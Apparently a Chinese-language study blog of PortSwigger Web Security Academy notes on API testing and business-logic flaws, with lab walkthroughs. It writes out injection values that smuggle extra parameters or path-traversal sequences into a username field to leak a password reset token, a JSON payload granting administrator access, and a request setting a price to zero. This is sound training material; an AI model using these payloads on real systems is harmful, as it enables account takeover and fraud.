<h2 id="5-2-Testing-for-server-side-parameter-pollution-in-REST-paths"><a href="#5-2-Testing-for-server-side-parameter-pollution-in-REST-paths" class="headerlink" title="5.2 Testing for server-side parameter pollution in REST paths"></a>5.2 Testing for server-side parameter pollution in REST paths</h2><p>RESTful API 可能将参数名称和值放置在 URL 路径中，而非查询字符串中。</p>
<p>例如，考虑以下路径：&#x2F;api&#x2F;users&#x2F;123</p>
<p>该 URL 路径可分解如下：</p>
<p>• &#x2F;api 是根 API 端点。</p>
<p>• &#x2F;users 代表资源，此处为用户资源。</p>
<p>• &#x2F;123 代表参数，此处是特定用户的标识符。</p>
<p>假设存在一个基于用户名编辑个人资料的应用程序。请求将发送至以下端点：</p>
<p>​<code>GET /edit_profile.php?name=peter</code></p>
<p>这将触发服务器端请求：</p>
<p>​<code>GET /api/private/users/peter</code></p>
<p>攻击者可能通过操纵服务器端URL路径参数来利用该API漏洞。测试此漏洞时，可添加路径遍历序列修改参数并观察应用程序响应。可提交URL编码的peter&#x2F;..&#x2F;admin作为name参数值：</p>
<p>​<code>GET /edit_profile.php?name=peter%2f..%2fadmin</code></p>
<p>这可能导致服务器端请求如下：</p>
<p>​<code>GET /api/private/users/peter/../admin</code></p>
<p>若服务器端客户端或后端API对路径进行规范化处理，则可能解析为 &#x2F;api&#x2F;private&#x2F;users&#x2F;admin。</p>
<h2 id="5-3-Testing-for-server-side-parameter-pollution-in-structured-data-formats"><a href="#5-3-Testing-for-server-side-parameter-pollution-in-structured-data-formats" class="headerlink" title="5.3 Testing for server-side parameter pollution in structured data formats"></a>5.3 Testing for server-side parameter pollution in structured data formats</h2><p>攻击者可能通过操纵参数来利用服务器处理其他结构化数据格式（如JSON或XML）时的漏洞。为测试此类漏洞，可向用户输入中注入异常结构化数据，观察服务器响应方式。<br>假设某应用允许用户编辑个人资料，并通过向服务器端API发送请求来应用修改。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">当编辑姓名时，浏览器将发送以下请求：</span></span><br><span class="line"><span class="string">POST</span> <span class="string">/myaccount</span></span><br><span class="line"><span class="string">name=peter</span></span><br><span class="line"></span><br><span class="line"><span class="string">这将触发服务器端请求：</span></span><br><span class="line"><span class="string">PATCH</span> <span class="string">/users/7312/update</span></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span><span class="string">:&quot;peter&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">尝试在请求中添加access_level参数：</span></span><br><span class="line"><span class="string">POST</span> <span class="string">/myaccount</span></span><br><span class="line"><span class="string">name=peter&quot;,&quot;access_level&quot;:&quot;administrator</span></span><br><span class="line"></span><br><span class="line"><span class="string">若用户输入未经充分验证或清理就直接添加到服务器端</span> <span class="string">JSON</span> <span class="string">数据中，将导致以下服务器端请求：</span></span><br><span class="line"><span class="string">PATCH</span> <span class="string">/users/7312/update</span></span><br><span class="line">&#123;<span class="string">name=&quot;peter&quot;</span>,<span class="string">&quot;access_level&quot;</span><span class="string">:&quot;administrator&quot;</span>&#125;</span><br><span class="line"><span class="string">这可能导致用户</span> <span class="string">peter</span> <span class="string">被授予管理员权限。</span></span><br></pre></td></tr></table></figure>

<p>考虑一个类似的例子，但客户端用户输入采用JSON数据格式。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">当你编辑姓名时，浏览器会发出以下请求：</span></span><br><span class="line"><span class="string">POST</span> <span class="string">/myaccount</span></span><br><span class="line">&#123;<span class="attr">&quot;name&quot;:</span> <span class="string">&quot;peter&quot;</span>&#125;</span><br><span class="line"><span class="string">这将导致服务器端发出以下请求：</span></span><br><span class="line"><span class="string">PATCH</span> <span class="string">/users/7312/update</span></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span><span class="string">:&quot;peter&quot;</span>&#125;</span><br><span class="line"><span class="string">若尝试在请求中添加access_level参数：</span></span><br><span class="line"><span class="string">POST</span> <span class="string">/myaccount</span></span><br><span class="line">&#123;<span class="attr">&quot;name&quot;:</span> <span class="string">&quot;peter&quot;</span>,<span class="string">&quot;access_level&quot;</span><span class="string">:&quot;administrator&quot;</span>&#125;</span><br><span class="line"><span class="string">当用户输入被解码后，若未进行充分编码就直接添加到服务器端JSON数据中，将导致服务器端发出以下请求：</span></span><br><span class="line"><span class="string">PATCH</span> <span class="string">/users/7312/update</span></span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span><span class="string">:&quot;peter&quot;</span>,<span class="string">&quot;access_level&quot;</span><span class="string">:&quot;administrator&quot;</span>&#125;</span><br><span class="line"><span class="string">这同样可能导致用户peter获得管理员权限。</span></span><br></pre></td></tr></table></figure>

<p>结构化格式注入也可能出现在响应中。例如，当用户输入被安全存储在数据库中，随后在后端API的JSON响应中未进行充分编码就直接嵌入时，就会发生这种情况。通常，您可以在响应中以与请求相同的方式检测和利用结构化格式注入。</p>
<p>‍</p>
<h1 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h1><h2 id="Lab-Exploiting-an-API-endpoint-using-documentation"><a href="#Lab-Exploiting-an-API-endpoint-using-documentation" class="headerlink" title="Lab: Exploiting an API endpoint using documentation"></a>Lab: Exploiting an API endpoint using documentation</h2><p><img src="/images/image-20251123131557-aor40oy.png" alt="image"></p>
<p>‍</p>
<p><img src="/images/image-20251123131701-acoqkdd.png" alt="image"></p>
<p>要解决这个问题，请找到公开的API文档并删除carlos。您可以使用以下凭据登录自己的帐户：wiener:peter。</p>
<p>使用凭证 wiener:peter 登录 Burp 的浏览器中的应用程序，并更新您的电子邮件地址。<br>在 Proxy &gt; HTTP history 中，右键点击 PATCH &#x2F;api&#x2F;user&#x2F;wiener 请求，并选择 Send to Repeater。<br>转到 Repeater 标签页。发送 PATCH &#x2F;api&#x2F;user&#x2F;wiener 请求。注意，这将检索用户 wiener 的凭证。<br>从请求的路径中删除 &#x2F;wiener，因此端点现在为 &#x2F;api&#x2F;user，然后发送请求。注意，这将返回一个错误，因为没有用户标识符。<br>从请求的路径中删除 &#x2F;user，因此端点现在为 &#x2F;api，然后发送请求。注意，这将检索 API 文档。</p>
<p><img src="/images/image-20251123132102-lpt82ks.png" alt="image"><br>右键点击响应，并选择 Show response in browser。复制 URL。<br>将 URL 粘贴到 Burp 的浏览器中以访问文档。注意，文档是交互式的。<br>要删除 Carlos 并解决实验室，请点击 DELETE 行，输入 carlos，然后点击 Send request。</p>
<p><img src="/images/image-20251123132240-nyofjd0.png" alt="image"></p>
<p>‍</p>
<h2 id="Lab-Finding-and-exploiting-an-unused-API-endpoint"><a href="#Lab-Finding-and-exploiting-an-unused-API-endpoint" class="headerlink" title="Lab: Finding and exploiting an unused API endpoint"></a>Lab: Finding and exploiting an unused API endpoint</h2><p>为了解决这个问题，利用一个隐藏的API端点来购买一件轻量级的l33t皮夹克。您可以使用以下凭据登录自己的帐户：wiener:peter。</p>
<h4 id="Required-knowledge"><a href="#Required-knowledge" class="headerlink" title="Required knowledge"></a>Required knowledge</h4><p>To solve this lab, you’ll need to know:</p>
<ul>
<li>How to use error messages to construct a valid request.</li>
<li>How HTTP methods are used by RESTful APIs.</li>
<li>How changing the HTTP method can reveal additional functionality.</li>
</ul>
<p>在Burp的浏览器中，访问实验室并点击一个产品。<br>在Proxy &gt; HTTP history中，注意到产品的API请求。例如，&#x2F;api&#x2F;products&#x2F;3&#x2F;price。<br>右击API请求并选择Send to Repeater。<br>在Repeater标签页中，将API请求的HTTP方法从GET改为OPTIONS，然后发送请求。注意，响应中指定了允许的GET和PATCH方法。<br>将API请求的方法从GET改为PATCH，然后发送请求。注意，您会收到一个未授权的消息。这可能表明您需要身份验证才能更新订单。<br>在Burp的浏览器中，使用凭据wiener:peter登录到应用程序。<br>点击轻量级“l33t”皮夹克产品。<br>在Proxy &gt; HTTP history中，右击皮夹克的API&#x2F;products&#x2F;1&#x2F;price请求并选择Send to Repeater。<br>在Repeater标签页中，将API请求的方法从GET改为PATCH，然后发送请求。注意，这将由于Content-Type不正确而导致错误。错误消息指定Content-Type应该是application&#x2F;json。<br>添加一个Content-Type头并将值设置为application&#x2F;json。</p>
<p><img src="/images/image-20251123135004-phubkvl.png" alt="image"><br>添加一个空JSON对象{}作为请求体，然后发送请求。注意，这将由于请求体中缺少price参数而导致错误。<br>向JSON对象添加一个值为0的price参数{“price”:0}。发送请求。<br>在Burp的浏览器中，重新加载皮夹克产品页面。注意，皮夹克的价格现在是<code>$0.00</code>.</p>
<p><img src="/images/image-20251123135046-5latj9i.png" alt="image"></p>
<ol>
<li>Add the leather jacket to your basket.</li>
<li>Go to your basket and click <strong>Place order</strong> to solve the lab.</li>
</ol>
<p>‍</p>
<h2 id="Lab-Exploiting-a-mass-assignment-vulnerability"><a href="#Lab-Exploiting-a-mass-assignment-vulnerability" class="headerlink" title="Lab: Exploiting a mass assignment vulnerability"></a>Lab: Exploiting a mass assignment vulnerability</h2><p>为了解决这个问题，找到并利用一个大规模分配漏洞来购买一件轻量级的l33t皮夹克。您可以使用以下凭据登录自己的帐户：wiener:peter。</p>
<p>为了解决这个实验室，你需要知道：<br>• 什么是批量赋值。<br>• 为什么批量赋值可能会导致隐藏的参数。<br>• 如何识别隐藏参数。<br>• 如何利用批量分配漏洞。</p>
<p>这些点在我们的话题中都有所涉及。</p>
<p><img src="/images/image-20251123170344-xucg0ny.png" alt="image"></p>
<p><img src="/images/image-20251123170401-l96g7hk.png" alt="image"></p>
<p>增加一个参数</p>
<p><img src="/images/image-20251123170643-acclji1.png" alt="image"></p>
<p><img src="/images/image-20251123170834-u7y5ia5.png" alt="image"></p>
<p>最后调到100</p>
<p><img src="/images/image-20251123170939-jl0w5kj.png" alt="image"></p>
<h2 id="Lab-Exploiting-server-side-parameter-pollution-in-a-query-string"><a href="#Lab-Exploiting-server-side-parameter-pollution-in-a-query-string" class="headerlink" title="Lab: Exploiting server-side parameter pollution in a query string"></a>Lab: Exploiting server-side parameter pollution in a query string</h2><p>首先，测试服务器端参数，发现%23和%26可以起到对应的作用</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">csrf=xb1WmGehcN4ynWtP4hXCynB26bi7gpUl&amp;username=administrator%26field=reset_token%23</span></span><br><span class="line"><span class="string">%23在field参属下没有被过滤，%26本来就可以用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">刚开始%26后面接的是x=y，不存在参数，改成field参数是错误消息提供的，</span></span><br><span class="line"><span class="string">field的值首先是遍历的，bp字典里有服务器端参数，爆出来一个email，出来结果是一样的，</span></span><br><span class="line"><span class="string">然后在js里发现了reset_token，然后返回了该账号下对应重置密码的token</span></span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="Lab-Exploiting-server-side-parameter-pollution-in-a-REST-URL"><a href="#Lab-Exploiting-server-side-parameter-pollution-in-a-REST-URL" class="headerlink" title="Lab: Exploiting server-side parameter pollution in a REST URL"></a>Lab: Exploiting server-side parameter pollution in a REST URL</h2><p>研究行为</p>
<ol>
<li>在Burp浏览器中，触发管理员用户的密码重置操作。</li>
<li>在代理 &gt; HTTP历史记录中，观察POST &#x2F;forgot-password请求及关联的&#x2F;static&#x2F;js&#x2F;forgotPassword.js JavaScript文件。</li>
<li>右键点击POST &#x2F;forgot-password请求，选择”发送到中继器”。</li>
<li>在中继器标签页重新发送请求，确认响应结果一致。</li>
<li>发送多种修改用户名参数值的请求，判断输入是否未经转义直接放入服务器端请求的URL路径：</li>
<li>提交URL编码的administrator#作为用户名参数值。<br>注意此操作返回无效路由错误。表明服务器可能将输入置于请求路径中，且片段截断了尾部数据。该错误信息同时提及API定义。</li>
<li>将用户名参数值从 administrator%23 改为 URL 编码的 administrator?，然后发送请求。<br>注意此操作同样返回无效路由错误。这表明输入可能位于URL路径中，因为?字符标志着查询字符串的起始位置，从而截断了URL路径。</li>
<li>将用户名参数值从administrator%3F改为.&#x2F;administrator后发送请求。<br>观察到此时返回原始响应。这表明请求可能访问了与原始请求相同的URL路径，进一步证实输入内容可能位于URL路径中。</li>
<li>将用户名参数值从.&#x2F;administrator改为..&#x2F;administrator，然后发送请求。<br>观察到此时返回无效路由错误信息。这表明请求可能访问了无效的URL路径。</li>
</ol>
<p>‍</p>
<p>导航至API定义</p>
<ol>
<li>将用户名参数值从 ..&#x2F;administrator 改为 ..&#x2F;%23。注意会收到无效路由响应。</li>
<li>逐步添加更多 ..&#x2F; 序列直至 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;%23。此时返回未找到响应，表明您已导航至API根目录之外。</li>
<li>在此层级，向URL路径添加常见API定义文件名。例如提交以下内容：<br>username&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;openapi.json%23<br>注意此时返回的错误信息包含用于查找用户的API端点：<br>&#x2F;api&#x2F;internal&#x2F;v1&#x2F;users&#x2F;{username}&#x2F;field&#x2F;{field}<br>请注意该接口说明URL路径包含名为field的参数</li>
</ol>
<p>‍</p>
<p>利用该漏洞</p>
<ol>
<li>根据已识别端点的结构更新用户名参数值。为字段参数添加无效值：<br>username&#x3D;administrator&#x2F;field&#x2F;foo%23<br>发送请求。注意此操作将返回错误信息，因为该API仅支持电子邮件字段。</li>
<li>将电子邮件作为字段参数值添加：<br>username&#x3D;administrator&#x2F;field&#x2F;email%23<br>发送请求。注意此时返回原始响应，表明服务器端应用识别了注入的field参数，且email属于有效字段类型。</li>
<li>在代理 &gt; HTTP历史记录中查看&#x2F;static&#x2F;js&#x2F;forgotPassword.js脚本文件。定位密码重置接口，该接口引用passwordResetToken参数：<br>&#x2F;forgot-password?passwordResetToken&#x3D;${resetToken}</li>
<li>在”重复器”选项卡中，将字段参数值从email改为passwordResetToken：<br>username&#x3D;administrator&#x2F;field&#x2F;passwordResetToken%23<br>发送请求。注意此时返回错误信息，因为应用程序设置的API版本不支持passwordResetToken参数。</li>
<li>使用先前确定的&#x2F;api&#x2F;接口，在username参数值中修改API版本：<br>username&#x3D;..&#x2F;..&#x2F;v1&#x2F;users&#x2F;administrator&#x2F;field&#x2F;passwordResetToken%23<br>发送请求。注意此时返回密码重置令牌，请记录该令牌。</li>
<li>在Burp浏览器地址栏输入密码重置接口。将密码重置令牌作为reset_token参数值添加，例如：<br>&#x2F;forgot-password?passwordResetToken&#x3D;123456789</li>
<li>设置新密码。</li>
<li>使用新密码以管理员身份登录。</li>
<li>进入管理面板删除carlos用户即可完成实验。</li>
</ol>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/23/API%20testing/" data-id="cmkqmafbb0000dwvs209t2jhs" data-title="5.API testing" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Business logic vulnerabilities" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/22/Business%20logic%20vulnerabilities/" class="article-date">
  <time class="dt-published" datetime="2026-01-21T18:23:43.000Z" itemprop="datePublished">2026-01-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/22/Business%20logic%20vulnerabilities/">4.Business logic vulnerabilities</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2026.1.22</p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>业务逻辑漏洞是应用程序设计和实现中的缺陷，允许攻击者引发意外行为。</p>
<p>逻辑错误通常对那些没有明确寻找它们的人来说是看不见的，因为它们通常不会通过应用程序的正常使用暴露出来。然而，攻击者可能能够通过以开发人员从未打算的方式与应用程序进行交互来利用。业务逻辑的主要目的之一是执行在设计应用程序或功能时定义的规则和约束。广义上讲，业务规则决定了应用程序在给定场景发生时应该如何反应。这包括防止用户做一些会对业务产生负面影响或根本没有任何意义的事情。</p>
<p>基于逻辑的漏洞可能非常多样，并且通常对应用程序及其特定功能来说是唯一的。识别它们通常需要一定的人类知识，例如对业务领域或攻击者在给定环境中可能拥有的目标的理解。这使得它们很难使用自动化漏洞扫描程序来检测。因此，逻辑缺陷是漏洞赏金猎人和手动测试人员的一个很好的目标。</p>
<h1 id="2-Excessive-trust-in-client-side-controls"><a href="#2-Excessive-trust-in-client-side-controls" class="headerlink" title="2.Excessive trust in client-side controls"></a>2.Excessive trust in client-side controls</h1><p>一个存在根本性缺陷的假设是，用户只会通过提供的Web界面与应用进行交互。</p>
<p>这一点尤其危险，因为它会导致进一步的假设，即客户端验证将防止用户提供恶意输入。然而，攻击者可以简单地使用诸如Burp Proxy之类的工具，在数据由浏览器发送但尚未传递给服务器端逻辑之前篡改数据。</p>
<p>这有效地使客户端控件变得无用。简单地按表面价值接受数据，而不执行适当的完整性检查和服务器端验证，可能会让攻击者以相对最小的努力造成各种破坏。他们能够实现的目标取决于功能以及可控数据正在做什么。在合适的背景下，这种漏洞可能会对业务相关功能和网站本身的安全性造成灾难性的后果。</p>
<h1 id="3-Failing-to-handle-unconventional-input"><a href="#3-Failing-to-handle-unconventional-input" class="headerlink" title="3.Failing to handle unconventional input"></a>3.Failing to handle unconventional input</h1><p>应用逻辑的一个目的是将用户输入限制为遵守业务规则的数值。</p>
<p>例如，应用程序可能会被设计为接受某种数据类型的任意值，但逻辑会从业务的角度确定这个值是否可接受。许多应用程序在其逻辑中加入了数值限制。</p>
<p>例如，数值数据类型可能会接受负值,而业务逻辑不允许这样做。然而，如果应用程序没有执行适当的服务器端验证并拒绝此输入，攻击者可能会传入负值并引发不良行为。考虑两个银行账户之间的资金转账。此功能几乎肯定会检查发件人是否有足够的资金来完成转账：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$transferAmount</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;amount&#x27;</span>];</span><br><span class="line"><span class="variable">$currentBalance</span> = <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">getBalance</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$transferAmount</span> &lt;= <span class="variable">$currentBalance</span>) &#123;</span><br><span class="line">    <span class="comment">// Complete the transfer</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Block the transfer: insufficient funds</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>在审计应用程序时，您应该使用诸如Burp Proxy和Repeater之类的工具尝试提交非常规值。特别是，尝试输入合法用户不太可能输入的范围内。这包括异常高或异常低的数字输入，以及基于文本的字段的异常长的字符串。您甚至可以尝试意外的数据类型。通过观察应用程序的响应，您应该尝试回答以下问题：</p>
<ol>
<li><p><strong>对数据有什么限制吗？</strong></p>
</li>
<li><p><strong>当你达到这些极限时会发生什么？</strong></p>
</li>
<li><p><strong>是否对您的输入执行了任何转换或规范化？</strong></p>
</li>
</ol>
<p>这可能会暴露弱输入验证，使您能够以不寻常的方式操作应用程序。请记住，如果你在目标网站上发现一个表单不能安全地处理非常规输入，那么其他表单很可能也会有同样的问题。</p>
<h1 id="4-Making-flawed-assumptions-about-user-behavior"><a href="#4-Making-flawed-assumptions-about-user-behavior" class="headerlink" title="4.Making flawed assumptions about user behavior"></a>4.Making flawed assumptions about user behavior</h1><p>逻辑漏洞最常见的根本原因之一是对用户行为做出有缺陷的假设。这可能会导致一系列问题，因为开发人员没有考虑到违反这些假设的潜在危险场景。在本节中，我们将提供一些应避免的常见假设的警示性示例，并演示它们如何导致危险的逻辑缺陷。</p>
<h2 id="4-1-信任的用户并不总是保持值得信赖"><a href="#4-1-信任的用户并不总是保持值得信赖" class="headerlink" title="4.1 信任的用户并不总是保持值得信赖"></a>4.1 信任的用户并不总是保持值得信赖</h2><p>应用程序可能看起来是安全的，因为它们实施了看似强大的措施来执行业务规则。不幸的是，一些应用程序错误地假设，通过了这些严格的初始控制后，用户和他们的数据就可以被无限期地信任。这可能会导致从那时起对相同控制的执行相对宽松。如果业务规则和安全措施在整个应用程序中没有得到一致的应用，这可能会导致潜在的危险漏洞，攻击者可能会利用这些漏洞。</p>
<p>这个实验室有缺陷的逻辑允许任意用户访问应该只对公司员工可用的管理功能。要解决实验室问题，请访问管理面板并删除用户carlos。</p>
<p><img src="/images/image-20251122123124-r2f16pq.png" alt="image"></p>
<h2 id="4-2-用户不会总是提供强制输入"><a href="#4-2-用户不会总是提供强制输入" class="headerlink" title="4.2 用户不会总是提供强制输入"></a>4.2 用户不会总是提供强制输入</h2><p>一个常见的误解是用户总会为必填的输入框提供值。浏览器可能会阻止普通用户在缺少必填输入的情况下提交表单，但正如我们所知，攻击者可以篡改传输中的参数。这甚至包括完全删除参数。在多个功能在同一服务器端脚本中实现的情况下，这是一个特别的问题。</p>
<p>在这种情况下，某个参数的存在与否可能决定执行哪段代码。删除参数值可能允许攻击者访问本应无法触及的代码路径。</p>
<p>在探测逻辑缺陷时，你应该尝试依次删除每个参数并观察这对响应产生的影响。你应该确保：</p>
<p>• 每次只删除一个参数，以确保到达所有相关的代码路径。</p>
<p>• 尝试删除参数名和参数值。服务器通常会区别处理这两种情况。</p>
<p> • 完整地遵循多阶段流程。</p>
<p>有时，在第一步篡改参数会对工作流中后续的步骤产生影响。 这既适用于URL参数也适用于POST参数，但也不要忘记检查cookie。这个简单的过程可以揭示一些可能可以被利用的奇怪的应用程序行为。</p>
<p>这个实验基于用户的输入对用户的权限级别做了一个有缺陷的假设。因此，您可以利用其帐户管理功能的逻辑来访问任意用户的帐户。要解决实验室问题，请访问管理员帐户并删除用户carlos。您可以使用以下凭据登录自己的帐户：wiener:peter</p>
<p><img src="/images/image-20251122124139-cx6qk81.png" alt="image"></p>
<p><img src="/images/image-20251122124055-4yvo20r.png" alt="image"></p>
<h2 id="4-3-用户并不总是遵循预期的顺序"><a href="#4-3-用户并不总是遵循预期的顺序" class="headerlink" title="4.3 用户并不总是遵循预期的顺序"></a>4.3 用户并不总是遵循预期的顺序</h2><p>许多交易依赖于由一系列步骤组成的预定义工作流。Web 界面通常会引导用户完成这个过程，每次他们完成当前步骤时，都会将他们带到工作流的下一步。</p>
<p>然而，攻击者不一定遵守这个预期的顺序。没有考虑到这种可能性可能会导致相对容易利用的危险漏洞。</p>
<p>例如，许多实施两步验证（2FA）的网站要求用户在一页上登录，然后在另一页上输入验证码。假设用户将始终遵循此过程并完成操作，因此不验证他们是否这样做，可能会使攻击者完全绕过 2FA 步骤。</p>
<p>对事件顺序做出假设可能会导致广泛的问题，即使是在相同的工作流或功能内。使用像Burp Proxy和Repeater这样的工具，一旦攻击者看到了一个请求，他们就可以随意重放它，并使用强制浏览以他们想要的任何顺序与服务器进行任何交互。</p>
<p>这允许他们在应用程序处于意外状态时完成不同的动作。为了识别这些种类的缺陷，你应该使用强制浏览以非预期的顺序提交请求。例如，你可能会跳过某些步骤，多次访问单个步骤，返回到早期的步骤，等等。注意不同步骤是如何访问的。虽然你经常只是向特定的URL提交一个GET或POST请求，但有时你可以通过向同一个URL提交不同的参数集来访问步骤。</p>
<p>与所有的逻辑缺陷一样，尽量找出开发人员做出了什么假设，以及攻击面在哪里。然后你可以寻找违反这些假设的方法。请注意，这种测试通常会导致异常，因为预期的变量具有null或未初始化的值。到达部分定义或不一致状态的位置也可能会导致应用程序崩溃。在这种情况下，请务必注意你遇到的任何错误消息或调试信息。这些可能是有价值的信息披露来源，可以帮助你微调攻击并了解后端行为的关键细节。</p>
<p>‍</p>
<h1 id="5-Domain-specific-flaws"><a href="#5-Domain-specific-flaws" class="headerlink" title="5.Domain-specific flaws"></a>5.Domain-specific flaws</h1><p>在许多情况下，您将遇到特定于业务领域或网站目的的逻辑漏洞。<code>在线商店的折扣功能</code>是寻找逻辑漏洞时的经典攻击面。对于攻击者来说，这可能是一个潜在的金矿，因为在应用折扣的方式上会出现各种基本的逻辑漏洞。</p>
<p>例如，考虑一个在线商店，该商店对超过1000美元的订单提供10%的折扣。如果业务逻辑未能检查折扣应用后订单是否被更改，那么这可能会容易被滥用。在这种情况下，攻击者可以简单地向购物车中添加商品，直到达到1000美元的阈值，然后在下单前删除他们不想要的商品。这样，即使订单不再满足预期条件，攻击者仍然可以享受折扣。</p>
<p>您应该特别注意任何根据用户操作确定的标准调整价格或其他敏感值的情况。尝试了解应用程序使用什么算法进行这些调整，以及在什么时候进行这些调整。这通常涉及操纵应用程序，使其处于应用调整与开发者最初意图的标准不符的状态。为了识别这些漏洞，您需要仔细考虑攻击者可能有什么目的，并尝试找到使用所提供的功能实现这一目的的不同方法。这可能需要一定程度的特定领域知识，以便了解在给定情况下什么可能是有利的。</p>
<ol>
<li>不同优惠券能交替重复使用</li>
<li>代金券可以买了之后折现，但是有可以优惠的折扣代码可以重复用，用宏的自动化实现</li>
</ol>
<p>‍</p>
<h1 id="6-Providing-an-encryption-oracle"><a href="#6-Providing-an-encryption-oracle" class="headerlink" title="6.Providing an encryption oracle"></a>6.Providing an encryption oracle</h1><p>当用户可控制的输入被加密，并且生成的密文以某种方式提供给用户时，可能会出现危险的情况。这种输入有时被称为“加密预言机”。</p>
<p>攻击者可以使用此输入使用正确的算法和非对称密钥加密任意数据。当应用程序中还有其他用户可控制的输入期望使用相同算法加密的数据时，这就会变得危险。</p>
<p>在这种情况下，攻击者可能会使用加密预言机生成有效的加密输入，然后将其传递给其他敏感功能。如果站点上还有另一个提供反向功能的用户可控制输入，这个问题可能会变得更加严重。这将使攻击者能够解密其他数据以识别预期的结构。这为他们创建恶意数据节省了一些工作，但并不是成功利用所必需的。加密预言机的严重性取决于哪些功能也使用与预言机相同的算法。</p>
<h1 id="7-Email-address-parser-discrepancies电子邮件地址解析器差异"><a href="#7-Email-address-parser-discrepancies电子邮件地址解析器差异" class="headerlink" title="7.Email address parser discrepancies电子邮件地址解析器差异"></a>7.Email address parser discrepancies电子邮件地址解析器差异</h1><p>一些网站会解析电子邮件地址以提取域名，并确定电子邮件所有者所属的组织。虽然这个过程最初看起来很简单，但实际上它非常复杂，即使对于有效的符合RFC标准的地址也是如此。</p>
<p>电子邮件地址解析中的差异可能会破坏这种逻辑。这些差异出现在应用程序的不同部分以不同方式处理电子邮件地址时。攻击者可以使用编码技术来掩盖电子邮件地址的部分，从而利用这些差异。这使得攻击者能够创建通过初始验证检查的电子邮件地址，但被服务器的解析逻辑以不同的方式解释。</p>
<p>电子邮件地址解析器差异的主要影响是未经授权的访问。攻击者可以使用来自受限域的看似有效的电子邮件地址注册账户。这使他们能够访问应用程序的敏感区域，例如管理面板或受限的用户功能。</p>
<h1 id="LAB"><a href="#LAB" class="headerlink" title="LAB"></a>LAB</h1><h2 id="Lab-Excessive-trust-in-client-side-controls"><a href="#Lab-Excessive-trust-in-client-side-controls" class="headerlink" title="Lab: Excessive trust in client-side controls"></a>Lab: Excessive trust in client-side controls</h2><p>这个实验没有充分验证用户输入。您可以利用其购买工作流中的逻辑缺陷，以意想不到的价格购买物品。为了解决实验室的问题，买一件“轻便的133t皮夹克”。您可以使用以下凭据登录自己的帐户：wiener:peter</p>
<p><img src="/images/image-20251120001315-i1zp13u.png" alt="image"></p>
<p><img src="/images/image-20251120001318-p49zfjd.png" alt="image"></p>
<p>‍</p>
<h2 id="Lab-High-level-logic-vulnerability"><a href="#Lab-High-level-logic-vulnerability" class="headerlink" title="Lab: High-level logic vulnerability"></a>Lab: High-level logic vulnerability</h2><p>这个实验没有充分验证用户输入。您可以利用其购买工作流中的逻辑缺陷，以意想不到的价格购买物品。为了解决实验室的问题，买一件“轻便的133t皮夹克”。您可以使用以下凭据登录自己的帐户：wiener:peter</p>
<p><img src="/images/image-20251120002417-rgt96gz.png" alt="image"></p>
<p>‍</p>
<p><img src="/images/image-20251120003235-0srlyf8.png" alt="image"></p>
<p>‍</p>
<h2 id="Lab-Inconsistent-handling-of-exceptional-input"><a href="#Lab-Inconsistent-handling-of-exceptional-input" class="headerlink" title="Lab: Inconsistent handling of exceptional input"></a>Lab: Inconsistent handling of exceptional input</h2><p>这个实验没有充分验证用户输入。您可以利用其帐户注册过程中的逻辑缺陷来访问管理功能。要解决实验室问题，请访问管理面板并删除用户carlos。</p>
<p>你可以使用实验室横幅中的链接来访问连接到你自己私有邮件服务器的电子邮件客户端。该客户端将显示发送到@YOUR-EMAIL-ID.web-security-academy.net 和任何任意子域的所有消息。你的唯一电子邮件 ID 将显示在电子邮件客户端中。</p>
